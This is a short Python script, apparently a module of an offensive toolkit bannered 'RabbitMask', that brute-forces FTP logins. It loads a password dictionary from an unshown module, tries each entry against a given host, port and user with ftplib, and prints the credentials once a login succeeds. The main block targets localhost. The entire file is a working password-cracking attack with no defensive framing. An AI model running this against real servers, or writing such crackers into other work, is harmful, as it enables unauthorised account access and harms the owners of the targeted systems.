#!/usr/bin/env python3
# _*_ coding:utf-8 _*_
'''
 ____       _     _     _ _   __  __           _
|  _ \ __ _| |__ | |__ (_) |_|  \/  | __ _ ___| | __
| |_) / _` | '_ \| '_ \| | __| |\/| |/ _` / __| |/ /
|  _ < (_| | |_) | |_) | | |_| |  | | (_| \__ \   <
|_| \_\__,_|_.__/|_.__/|_|\__|_|  |_|\__,_|___/_|\_\
'''
import ftplib
from Dictionaries.level_dic import Level_dic


def Ftp_crack(host,port,user,lv):
    pwds=Level_dic(lv)
    print('字典加载成功：{}条'.format(len(pwds)))
    for i in pwds:
        i=i.replace('\n','')
        print('Cracking ：'+i)
        ftp = ftplib.FTP()
        try:
            ftp.connect(host, int(port))
            ftp.login(user, i)
            ftp.quit()
            print("Cracks Sussess!\nusername: {}\npassword: {}".format(user,i))
            break
        except:
            pass


def run(host,port,user,lv):
    Ftp_crack(host, port, user, lv)

if __name__ == '__main__':
    run('127.0.0.1',21,'rabbit',1)